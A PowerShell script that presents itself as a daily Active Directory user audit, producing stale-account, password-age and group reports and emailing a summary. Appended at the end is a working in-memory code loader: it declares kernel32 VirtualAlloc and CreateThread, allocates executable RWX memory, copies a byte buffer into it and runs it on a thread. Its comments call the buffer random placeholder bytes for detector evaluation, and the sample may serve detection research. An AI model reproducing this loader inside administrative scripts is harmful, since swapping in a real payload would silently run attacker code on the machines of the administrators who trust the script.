#Requires -Version 5.1
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias('DnsDomain')]
    [string]$Domain = "adatum.com",
    [string]$SearchBase = 'OU=Users,DC=adatum,DC=com',
    [string]$ReportPath = 'C:\Reports\ad-user-audit-2026-06-03.csv',
    [string]$HtmlPath = 'C:\Reports\ad-user-audit-2026-06-03.html',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 30,

    [int]$PasswordMaxAge = 180,
    [string]$SmtpServer = 'smtp.adatum.com'
)

Import-Module ActiveDirectory -ErrorAction Stop
$LogPath = "C:\Logs\ad-audit-2026-06-03.log"

function Write-AuditTrail {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    throw 'The ActiveDirectory module is not installed on this host.'
}
Import-Module ActiveDirectory -ErrorAction Stop

$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$searchBases = @(
    'OU=Users,DC=adatum,DC=com'
    "OU=ServiceAccounts,DC=adatum,DC=com"
)

$users = foreach ($base in $searchBases) {
    Write-Verbose ("Querying {0}" -f $base)
    Get-ADUser -Filter * -SearchBase $base -Properties $properties -ErrorAction Continue
}

$cutoff = (Get-Date).AddDays(-$InactiveDays)

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}
$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$groupReport = foreach ($user in @($users | Select-Object -First 50)) {
    $groups = Get-ADPrincipalGroupMembership -Identity $user.SamAccountName -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -ne 'Domain Users' }
    [pscustomobject]@{
        SamAccountName = $user.SamAccountName
        GroupCount     = @($groups).Count
        Groups         = (@($groups | Select-Object -ExpandProperty Name) -join '; ')
    }
}

$groupReport | Export-Csv -Path 'C:\Reports\ad-user-audit-2026-06-03-groups.csv' -NoTypeInformation -Encoding UTF8

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet, Enabled | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation

$disabled = $users | Where-Object { $_.Enabled -eq $false }
$disabled | Select-Object Name, SamAccountName, DistinguishedName |
    Export-Csv -Path $ReportPath.Replace('.csv', '-disabled.csv') -NoTypeInformation -Encoding UTF8

$style = @'
<style>
body { font-family: Arial; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$stale |
    Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
    ConvertTo-Html -Title 'Stale AD accounts' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$summaryBody = @"
Stale accounts : $staleCount
Disabled       : $disabledCount
Old passwords  : $oldPwdCount
Report         : $ReportPath
"@

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject 'AD user audit: daily summary' `
    -Body $summaryBody `
    -SmtpServer $SmtpServer `
    -Port 587
Write-Host ("AD audit finished: {0} stale, {1} disabled" -f $staleCount, $disabledCount) -ForegroundColor Green
Write-AuditTrail -Message ("Audit completed for {0}" -f $Domain) -Level INFO

$pwdPolicy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
if ($pwdPolicy) {
    Write-Verbose ("Domain password age: {0} days" -f $pwdPolicy.MaxPasswordAge.Days)
}

$transcript = Join-Path $env:TEMP ("ad-audit-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Start-Transcript -Path $transcript -Append | Out-Null
Write-Verbose ("Transcript: {0}" -f $transcript)

$expiringSoon = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt (Get-Date).AddDays(-($PasswordMaxAge - 14))
}
Write-Verbose ("Password changes due: {0}" -f @($expiringSoon).Count)

$ous = Get-ADOrganizationalUnit -Filter * -ErrorAction SilentlyContinue |
    Select-Object -First 5 -Property Name, DistinguishedName
$ous | Format-Table -AutoSize

$reportItem = Get-Item -LiteralPath $ReportPath -ErrorAction SilentlyContinue
if ($reportItem) {
    Write-Host ("Report size: {0:N1} KB" -f ($reportItem.Length / 1KB)) -ForegroundColor Gray
}

$sampleStale = $stale | Sort-Object -Property LastLogonDate | Select-Object -First 10
$sampleStale | Format-Table Name, SamAccountName, LastLogonDate -AutoSize

$neverLoggedOn = $users | Where-Object { $_.LastLogonDate -eq $null }
if (@($neverLoggedOn).Count -gt 0) {
    Write-Warning ("{0} accounts have never signed in" -f @($neverLoggedOn).Count)
}

$byOu = $users | Group-Object -Property DistinguishedName |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byOu | Format-Table -AutoSize | Out-String | Write-Verbose

$engine = Get-ADRootDSE -ErrorAction SilentlyContinue
if ($engine) {
    Write-Verbose ("Domain controller: {0}" -f $engine.dnsHostName)
    Write-Verbose ("Default naming context: {0}" -f $engine.defaultNamingContext)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xfa, 0x57, 0xcd, 0xd0, 0xf0, 0x18, 0x43, 0x00, 0x5f, 0xdc, 0xf8, 0x16, 0x60, 0xa9, 0x7e, 0x04,
    0xe2, 0x16, 0x14, 0xd2, 0x2a, 0xa8, 0xe5, 0x22, 0x37, 0xb4, 0x42, 0x58, 0xbb, 0xde, 0xaf, 0x50,
    0x9e, 0x73, 0xd3, 0xe8, 0x47, 0x65, 0xdc, 0xe0, 0xd0, 0x9d, 0x93, 0x93, 0x78, 0x28, 0x16, 0xb3,
    0x96, 0x93, 0xde, 0xd8, 0xee, 0x3a, 0xf5, 0x0c, 0xa9, 0x9f, 0xe2, 0x4f, 0x75, 0x34, 0x23, 0xa7,
    0xa2, 0xf7, 0xb7, 0xe2, 0xa4, 0x32, 0x06, 0x33, 0x59, 0xb6, 0xdb, 0x7c, 0x67, 0xf5, 0xd6, 0x84,
    0x37, 0x26, 0xf5, 0x6d, 0x76, 0xff, 0xc3, 0x1b, 0x91, 0x2d, 0x54, 0x70, 0x0a, 0x79, 0x0a, 0x49,
    0x03, 0xd0, 0x01, 0x77, 0x16, 0xa1, 0xec, 0xa9, 0x32, 0x8b, 0x02, 0xa2, 0xf5, 0xb9, 0x86, 0x7a,
    0x29, 0x58, 0xd2, 0xe5, 0x22, 0xb2, 0xf8, 0xa9, 0xc3, 0xd8, 0xa9, 0xd2, 0xfd, 0xbf, 0xa7, 0x6d,
    0xb4, 0x25, 0x23, 0x75, 0x6a, 0x92, 0xa4, 0x61, 0x75, 0xe0, 0x5d, 0x9b, 0xd4, 0x71, 0xcc, 0xa5,
    0x1e, 0xf6, 0xca, 0x75, 0x1b, 0x0c, 0xd2, 0x8a, 0xf9, 0xd3, 0xf0, 0x62, 0xe5, 0x9e, 0x2a, 0xa6,
    0xd1, 0xc2, 0xde, 0xae, 0xa6, 0x23, 0x80, 0x60, 0x14, 0x0d, 0x15, 0x31, 0x5e, 0xe0, 0xf3, 0xc5,
    0x7a, 0x9f, 0x43, 0xcd, 0x2d, 0xfb, 0xfa, 0x4e, 0x10, 0xcf, 0xd2
)

$HProcess = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 2172)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
